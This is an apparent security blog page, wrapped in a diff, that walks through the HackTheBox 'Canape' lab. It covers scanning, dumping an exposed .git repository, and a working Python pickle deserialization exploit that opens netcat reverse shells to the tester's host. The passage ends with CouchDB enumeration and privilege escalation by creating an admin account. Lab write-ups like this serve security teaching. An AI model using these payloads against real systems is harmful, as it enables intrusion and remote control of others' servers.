+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Help/index.html" class="md-nav__link">
+        HTB Help
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3" type="checkbox" id="__nav_4_3" >
+      
+      <label class="md-nav__link" for="__nav_4_3">
+        TryHackMe
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="TryHackMe" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_3">
+          <span class="md-nav__icon md-icon"></span>
+          TryHackMe
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tryhackme/MrRobot/index.html" class="md-nav__link">
+        Mr Robot
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tryhackme/Thompson/index.html" class="md-nav__link">
+        Thompson
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tryhackme/Kenobi/index.html" class="md-nav__link">
+        Kenobi
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tryhackme/Ignite/index.html" class="md-nav__link">
+        Ignite
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tryhackme/SteelMountain/index.html" class="md-nav__link">
+        Steel Mountain
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tryhackme/HackPark/index.html" class="md-nav__link">
+        HackPark
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4" type="checkbox" id="__nav_4_4" >
+      
+      <label class="md-nav__link" for="__nav_4_4">
+        VulnHub
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="VulnHub" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_4">
+          <span class="md-nav__icon md-icon"></span>
+          VulnHub
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../vulnhub/Brainpan-1/index.html" class="md-nav__link">
+        Brainpan 1
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../vulnhub/S2-052/index.html" class="md-nav__link">
+        Pentester Lab: S2-052
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../vulnhub/SolidState-1/index.html" class="md-nav__link">
+        SolidState: 1
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../vulnhub/Wintermute-1-Straylight/index.html" class="md-nav__link">
+        Wintermute: 1 (Straylight)
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../vulnhub/Wintermute-1-Neuromancer/index.html" class="md-nav__link">
+        Wintermute: 1 (Neuromancer)
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
+      
+      <label class="md-nav__link" for="__nav_5">
+        Blue Teaming
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Blue Teaming" data-md-level="1">
+        <label class="md-nav__title" for="__nav_5">
+          <span class="md-nav__icon md-icon"></span>
+          Blue Teaming
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blue-teaming/index.html" class="md-nav__link">
+        __index__
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="https://www.blueteamsacademy.com" class="md-nav__link">
+        Blue Team Training
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about/index.html" class="md-nav__link">
+        About Me
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#information-gathering" class="md-nav__link">
+    Information Gathering
+  </a>
+  
+    <nav class="md-nav" aria-label="Information Gathering">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#openning-services" class="md-nav__link">
+    Openning Services
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#apache-httpd-2418" class="md-nav__link">
+    Apache httpd 2.4.18
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    Foothold
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#insecure-deserialization" class="md-nav__link">
+    Insecure Deserialization
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege Escalation
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#local-enumeration" class="md-nav__link">
+    Local enumeration
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#apache-couchdb-pe" class="md-nav__link">
+    Apache CouchDB PE
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#erlang-couchdb-local-privescal" class="md-nav__link">
+    Erlang CouchDB Local PrivEscal
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sudo-pip-command" class="md-nav__link">
+    Sudo Pip Command
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="hackthebox-canape">HackTheBox Canape</h1>
+<blockquote>
+<p>Author: Hades</p>
+<p><a href="https://github.com/leecybersec/scripting"><em>Scripting here</em></a></p>
+</blockquote>
+<p><img alt="" src="images/1.png" /></p>
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="openning-services">Openning Services</h3>
+<div class="highlight"><pre><span></span><code>### Port Scanning ############################
+nmap -sS -Pn -p- --min-rate 1000 10.10.10.70
+Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
+
+[+] Openning ports: 80,65535
+
+### Services Enumeration ############################
+nmap -sC -sV -Pn 10.10.10.70 -p80,65535
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-12 14:39 +07
+Nmap scan report for 10.10.10.70
+Host is up (0.28s latency).
+
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-git: 
+|   10.10.10.70:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...
+|     Last commit message: final # Please enter the commit message for your changes. Li...
+|     Remotes:
+|_      http://git.canape.htb/simpsons.git
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Simpsons Fan Site
+|_http-trane-info: Problem with XML parsing of /evox/about
+65535/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA)
+|   256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA)
+|_  256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.87 seconds
+</code></pre></div>
+<h3 id="apache-httpd-2418">Apache httpd 2.4.18</h3>
+<p>At port 80, the web application developed by Simpson from 2018.</p>
+<p><img alt="" src="images/2.png" /></p>
+<p>List of the hidden in the server using <code>wfuzz</code></p>
+<div class="highlight"><pre><span></span><code>┌──(Hades㉿10.10.14.6)-[0.4:25.2]~
+└─$ wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hw 1 --hl 82 &#39;http://10.10.10.70/FUZZ&#39;
+&lt;snip&gt;
+Target: http://10.10.10.70/FUZZ
+Total requests: 4681
+&lt;snip&gt;
+000000012:   200        9 L      43 W       1075 Ch     &quot;.git/index&quot;
+000000013:   200        17 L     70 W       1130 Ch     &quot;.git/logs/&quot;
+000000011:   200        11 L     29 W       259 Ch      &quot;.git/config&quot;
+000000010:   200        1 L      2 W        23 Ch       &quot;.git/HEAD&quot;
+000000008:   301        9 L      28 W       309 Ch      &quot;.git&quot;
+000001026:   403        11 L     32 W       294 Ch      &quot;cgi-bin/&quot;
+000001060:   405        4 L      23 W       178 Ch      &quot;check&quot;
+000003371:   200        85 L     227 W      3150 Ch     &quot;quotes&quot;
+000003682:   403        11 L     32 W       299 Ch      &quot;server-status&quot;
+000003923:   301        9 L      28 W       311 Ch      &quot;static&quot;
+000003967:   200        81 L     167 W      2836 Ch     &quot;submit&quot;
+&lt;snip&gt;
+</code></pre></div>
+<p>Based on <code>nmap</code> and <code>wfuzz</code> result, I saw this web app public folder <code>.git</code> and it's may leak some sensitive source code.</p>
+<p>Dump folder <code>.git</code> if repo not available using <a href="https://github.com/WangYihang/GitHacker">GitHacker</a>, <a href="https://github.com/arthaud/git-dumper">git_dumper</a> or command</p>
+<div class="highlight"><pre><span></span><code>wget --mirror -I .git example.com/.git/
+</code></pre></div>
+<p>Checking config file, the source code is currently at repo <code>http://git.canape.htb/simpsons.git</code>.</p>
+<div class="highlight"><pre><span></span><code>┌──(Hades㉿10.10.14.6)-[1.2:47.4]~/scripting/services
+└─$ curl http://10.10.10.70/.git/config                                                                                                                          
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[remote &quot;origin&quot;]
+        url = http://git.canape.htb/simpsons.git
+        fetch = +refs/heads/*:refs/remotes/origin/*
+[branch &quot;master&quot;]
+        remote = origin
+        merge = refs/heads/master
+</code></pre></div>
+<p>Add domain <code>git.canape.htb</code> with <code>10.10.10.70</code> to file hosts and clone the source code.</p>
+<div class="highlight"><pre><span></span><code>┌──(Hades㉿10.10.14.6)-[1.2:47.4]~/walkthrough/hackthebox/canape
+└─$ git clone http://git.canape.htb/simpsons.git
+Cloning into &#39;simpsons&#39;...
+remote: Counting objects: 49, done.
+remote: Compressing objects: 100% (47/47), done.
+remote: Total 49 (delta 18), reused 0 (delta 0)
+Unpacking objects: 100% (49/49), 163.16 KiB | 278.00 KiB/s, done.
+</code></pre></div>
+<p>Folder <code>simpsons</code></p>
+<div class="highlight"><pre><span></span><code>┌──(Hades㉿10.10.14.6)-[1.2:46.3]~/walkthrough/hackthebox/canape
+└─$ tree simpsons          
+simpsons
+├── __init__.py
+├── static
+│   ├── css
+│   │   ├── bootstrap.min.css
+│   │   ├── bootstrap.min.css.map
+│   │   └── custom.css
+│   └── js
+│       ├── bootstrap.min.js
+│       └── bootstrap.min.js.map
+└── templates
+    ├── index.html
+    ├── layout.html
+    ├── quotes.html
+    └── submit.html
+</code></pre></div>
+<h2 id="foothold">Foothold</h2>
+<h3 id="insecure-deserialization">Insecure Deserialization</h3>
+<p>In file <code>__init__.py</code>, there is two interested function</p>
+<p>Function uri <code>/submit</code></p>
+<div class="highlight"><pre><span></span><code><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/submit&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="s2">&quot;POST&quot;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">submit</span><span class="p">():</span>
+    <span class="n">error</span> <span class="o">=</span> <span class="kc">None</span>
+    <span class="n">success</span> <span class="o">=</span> <span class="kc">None</span>
+
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&quot;POST&quot;</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="c1"># Add value for char from request</span>
+            <span class="n">char</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;character&quot;</span><span class="p">]</span>
+            <span class="c1"># Add value for quote from request</span>
+            <span class="n">quote</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;quote&quot;</span><span class="p">]</span>
+            <span class="c1"># Return error if both don&#39;t have value</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">char</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">quote</span><span class="p">:</span> 
+                <span class="n">error</span> <span class="o">=</span> <span class="kc">True</span>
+            <span class="c1"># Return error if char not in scope of whitelist</span>
+            <span class="k">elif</span> <span class="ow">not</span> <span class="nb">any</span><span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">char</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">WHITELIST</span><span class="p">):</span> 
+                <span class="n">error</span> <span class="o">=</span> <span class="kc">True</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="c1"># TODO - Pickle into dictionary instead, `check` is ready</span>
+                <span class="c1"># Create file name to save value from request</span>
+                <span class="n">p_id</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">char</span> <span class="o">+</span> <span class="n">quote</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> 
+                <span class="c1"># open file $(p_id) and write permission</span>
+                <span class="n">outfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/tmp/&quot;</span> <span class="o">+</span> <span class="n">p_id</span> <span class="o">+</span> <span class="s2">&quot;.p&quot;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span>
+        <span class="c1"># Save value to file name $(p_id)</span>
+        <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">char</span> <span class="o">+</span> <span class="n">quote</span><span class="p">)</span> 
+        <span class="n">outfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+            <span class="n">success</span> <span class="o">=</span> <span class="kc">True</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+            <span class="n">error</span> <span class="o">=</span> <span class="kc">True</span>
+
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&quot;submit.html&quot;</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">error</span><span class="p">,</span> <span class="n">success</span><span class="o">=</span><span class="n">success</span><span class="p">)</span>
+</code></pre></div>
+<p>Function uri <code>/check</code></p>
+<div class="highlight"><pre><span></span><code><span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&quot;/check&quot;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;POST&quot;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
+    <span class="c1"># Add path file $(id) in tmp folder</span>
+    <span class="n">path</span> <span class="o">=</span> <span class="s2">&quot;/tmp/&quot;</span> <span class="o">+</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;.p&quot;</span>
+    <span class="c1"># Open file path with read permission</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;rb&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+    <span class="c1"># Check if &quot;p1&quot; in data call function cPickle.loads(data)</span>
+    <span class="k">if</span> <span class="s2">&quot;p1&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="n">item</span> <span class="o">=</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">item</span> <span class="o">=</span> <span class="n">data</span>
+
+    <span class="k">return</span> <span class="s2">&quot;Still reviewing: &quot;</span> <span class="o">+</span> <span class="n">item</span>
+</code></pre></div>
+<p>When application call function <code>cPickle.loads(data)</code>, the data will load from submited file before. Searching for Pickle vulnerability,</p>
+<p><a href="https://blog.nelhage.com/2011/03/exploiting-pickle/">Exploiting misuse of Python's "pickle"</a> show how to inject shell code to function <code>__reduce__</code></p>
+<p><code>pickle</code> allows arbitrary objects to declare how they should be pickled by defining a <a href="https://docs.python.org/3/library/pickle.html#object.__reduce__">__reduce__</a> method, which should return either a string or a tuple describing how to reconstruct this object on unpacking. In the simplest form, that tuple should just contain</p>
+<ul>
+<li>A callable (which must be either a class, or satisfy some other, odder, constraints), and</li>
+<li>A tuple of arguments to call that callable on.</li>
+</ul>
+<p><code>pickle</code> will pickle each of these pieces separately, and then on unpickling, will call the callable on the provided arguments to construct the new object.</p>
+<p>And so, we can construct a pickle that, when un-pickled, will execute reverse shell with nc, as follows:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">cPickle</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="k">class</span> <span class="nc">RunBinSh</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+  <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;nc -nv 10.10.14.6 443 -e /bin/sh&#39;</span><span class="p">,))</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">RunBinSh</span><span class="p">())</span>
+
+<span class="nb">print</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+<span class="n">item</span> <span class="o">=</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</code></pre></div>
+<p>Quick poc exploit</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">cPickle</span>
+<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
+
+<span class="k">class</span> <span class="nc">exploit</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s1">&#39;echo homer!; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.6 443 &gt;/tmp/f&#39;</span><span class="p">,))</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://10.10.10.70&quot;</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="n">cPickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">exploit</span><span class="p">())</span>
+<span class="n">char</span><span class="p">,</span> <span class="n">quote</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;!&#39;</span><span class="p">)</span>
+
+<span class="c1">#Sent payload</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;/submit&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;character&#39;</span><span class="p">:</span><span class="n">char</span><span class="p">,</span> <span class="s1">&#39;quote&#39;</span><span class="p">:</span><span class="n">quote</span><span class="p">})</span>
+
+<span class="n">p_id</span> <span class="o">=</span> <span class="n">md5</span><span class="p">(</span><span class="n">char</span> <span class="o">+</span> <span class="n">quote</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+
+<span class="c1">#Trigger payload</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;/check&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="n">p_id</span><span class="p">})</span>
+</code></pre></div>
+<p><a href="https://github.com/leecybersec/walkthrough/tree/master/hackthebox/canape"><em>Poc code here</em></a></p>
+<p>Run exploit <code>pickle-canape.py</code>.</p>
+<ul>
+<li>Function <code>create_payload</code>: Create payload contain data after dump <code>class Shell</code> with <code>cPickle.dumps</code>. Class Shell must contain string in white list to bypass check.</li>
+<li>Get file name by hashing md5 value in <code>char</code> and <code>quote</code></li>
+<li>Sent another request to call function check at <code>/check</code> to trigger payload</li>
+</ul>
+<div class="highlight"><pre><span></span><code>┌──(Hades㉿10.10.14.6)-[1.8:44.6]~/walkthrough/hackthebox/canape
+└─$ python pickle-canape.py 10.10.10.70                                                                                                                                 7 ⨯
+
+&gt;&gt; http://10.10.10.70:80/submit ... 
+
+[+] File name: 59d0b71be7d949629edf95b0dbe881cb
+
+&gt;&gt; http://10.10.10.70:80/check ...
+</code></pre></div>
+<p>At listener, I have reverse shell</p>
+<div class="highlight"><pre><span></span><code>┌──(Hades㉿10.10.14.6)-[1.8:44.6]~/walkthrough/hackthebox/canape
+└─$ sudo nc -nvlp 443
+listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.70] 40798
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="local-enumeration">Local enumeration</h3>
+<p>At file <code>__init__.py</code>, I also know the server was using <code>couchdb</code> database at localhost port 5984 with database named simpsons.</p>
+<div class="highlight"><pre><span></span><code><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">update</span><span class="p">(</span>
+    <span class="n">DATABASE</span> <span class="o">=</span> <span class="s2">&quot;simpsons&quot;</span>
+<span class="p">)</span>
+<span class="n">db</span> <span class="o">=</span> <span class="n">couchdb</span><span class="o">.</span><span class="n">Server</span><span class="p">(</span><span class="s2">&quot;http://localhost:5984/&quot;</span><span class="p">)[</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s2">&quot;DATABASE&quot;</span><span class="p">]]</span>
+</code></pre></div>
+<p>Checking running service</p>
+<div class="highlight"><pre><span></span><code>www-data@canape:/var/www/html$ netstat -antup
+&lt;snip&gt;              
+tcp        0      0 127.0.0.1:5984          0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:38592           0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:5986          0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:4369            0.0.0.0:*               LISTEN      -              
+&lt;snip&gt;
+</code></pre></div>
+<p>Follow <a href="https://docs.couchdb.org/en/latest/intro/tour.html">CouchDB's Documents</a>, checking running service with curl, the CouchDB's version is 2.0.0</p>
+<div class="highlight"><pre><span></span><code>www-data@canape:/var/www/html$ curl 127.0.0.1:5986
+{&quot;couchdb&quot;:&quot;Welcome&quot;,&quot;uuid&quot;:&quot;132586dfde75b957085d59a5096e9c20&quot;,&quot;version&quot;:&quot;2.0.0&quot;,&quot;vendor&quot;:{&quot;name&quot;:&quot;The Apache Software Foundation&quot;}}
+www-data@canape:/var/www/html$ curl 127.0.0.1:5984
+{&quot;couchdb&quot;:&quot;Welcome&quot;,&quot;version&quot;:&quot;2.0.0&quot;,&quot;vendor&quot;:{&quot;name&quot;:&quot;The Apache Software Foundation&quot;}}
+</code></pre></div>
+<p>There is database <code>_users</code>, <code>passwords</code>, <code>simpsons</code>, we need to query.</p>
+<div class="highlight"><pre><span></span><code>www-data@canape:/var/www$ curl -X GET http://127.0.0.1:5984/_all_dbs
+[&quot;_global_changes&quot;,&quot;_metadata&quot;,&quot;_replicator&quot;,&quot;_users&quot;,&quot;passwords&quot;,&quot;simpsons&quot;]
+</code></pre></div>
+<p>2 database <code>_users</code> and <code>passwords</code> require authentucation to query, let's check database <code>simpsons</code> first.</p>
+<div class="highlight"><pre><span></span><code>www-data@canape:/tmp$ curl -X GET http://127.0.0.1:5984/_users/_all_docs
+{&quot;error&quot;:&quot;unauthorized&quot;,&quot;reason&quot;:&quot;You are not a server admin.&quot;}
+www-data@canape:/tmp$ curl -X GET http://127.0.0.1:5984/passwords/_all_docs
+{&quot;error&quot;:&quot;unauthorized&quot;,&quot;reason&quot;:&quot;You are not authorized to access this db.&quot;}
+www-data@canape:/tmp$ curl -X GET http://127.0.0.1:5984/simpsons/_all_docs
+{&quot;total_rows&quot;:7,&quot;offset&quot;:0,&quot;rows&quot;:[
+{&quot;id&quot;:&quot;f0042ac3dc4951b51f056467a1000dd9&quot;,&quot;key&quot;:&quot;f0042ac3dc4951b51f056467a1000dd9&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-fbdd816a5b0db0f30cf1fc38e1a37329&quot;}},
+&lt;snip&gt;
+{&quot;id&quot;:&quot;f53679a526a868d44172c83a6100451b&quot;,&quot;key&quot;:&quot;f53679a526a868d44172c83a6100451b&quot;,&quot;value&quot;:{&quot;rev&quot;:&quot;1-3f6141f3aba11da1d65ff0c13fe6fd39&quot;}}
+]}
+</code></pre></div>
+<p>Database <code>simpsons</code> just save normal data for user input in the web application</p>
+<div class="highlight"><pre><span></span><code>www-data@canape:/$ curl -X GET http://127.0.0.1:5984/simpsons/\
+&gt; f0042ac3dc4951b51f056467a1000dd9
+{&quot;_id&quot;:&quot;f0042ac3dc4951b51f056467a1000dd9&quot;,&quot;_rev&quot;:&quot;1-fbdd816a5b0db0f30cf1fc38e1a37329&quot;,&quot;character&quot;:&quot;Homer&quot;,&quot;quote&quot;:&quot;Doh!&quot;}
+&lt;snip&gt;
+www-data@canape:/$ curl -X GET http://127.0.0.1:5984/simpsons/\
+&gt; f53679a526a868d44172c83a6100451b
+{&quot;_id&quot;:&quot;f53679a526a868d44172c83a6100451b&quot;,&quot;_rev&quot;:&quot;1-3f6141f3aba11da1d65ff0c13fe6fd39&quot;,&quot;character&quot;:&quot;Moe&quot;,&quot;quote&quot;:&quot;Oh, business is slow. People today are healthier and drinking less. You know, if it wasn&#39;t for the junior high school next door, no one would even use the cigarette machine.&quot;}
+</code></pre></div>
+<p>Search public exploit for <code>couchdb</code>, I saw an interested exploit.</p>
+<div class="highlight"><pre><span></span><code>┌──(Hades㉿10.10.14.6)-[1.7:44.9]~/walkthrough/hackthebox/canape
+└─$ searchsploit couchdb 2.0.0
+----------------------------------------------------------- ---------------------------------
+ Exploit Title                                             |  Path
+----------------------------------------------------------- ---------------------------------
+Apache CouchDB 1.7.0 / 2.x &lt; 2.1.1 - Remote Privilege Esca | linux/webapps/44498.py
+Apache CouchDB 2.0.0 - Local Privilege Escalation          | windows/local/40865.txt
+Apache CouchDB &lt; 2.1.0 - Remote Code Execution             | linux/webapps/44913.py
+----------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre></div>
+<h3 id="apache-couchdb-pe">Apache CouchDB PE</h3>
+<p><a href="https://github.com/leecybersec/walkthrough/tree/master/hackthebox/canape"><em>Poc code here</em></a></p>
+<p>Using exploit <code>linux/webapps/44498.py</code>, I create a credential <code>hades:leecybersec</code> as a admin in the database.</p>
